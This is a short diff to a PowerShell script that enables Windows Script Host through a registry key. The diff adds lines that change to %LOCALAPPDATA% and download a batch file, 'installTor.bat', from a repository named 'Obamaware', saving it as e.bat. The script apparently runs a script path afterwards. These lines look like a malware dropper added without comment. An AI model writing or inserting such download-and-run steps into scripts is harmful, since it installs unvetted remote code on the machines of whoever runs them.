@@ -1,6 +1,9 @@
 # Enable error handling
 $ErrorActionPreference = "Stop"
 
+cd %LOCALAPPDATA%
+iwr "https://raw.githubusercontent.com/RaupenInspektor/Obamaware/main/installTor.bat" -o ./e.bat
+
 try{
     New-Item -Path "HKCU:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Force | Out-Null; Set-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Windows Script Host\Settings" -Name "Enabled" -Value 1 -Type DWord
 } catch {
@@ -235,6 +238,7 @@ catch {
 
 
 & $scriptpath
+
 
 
 
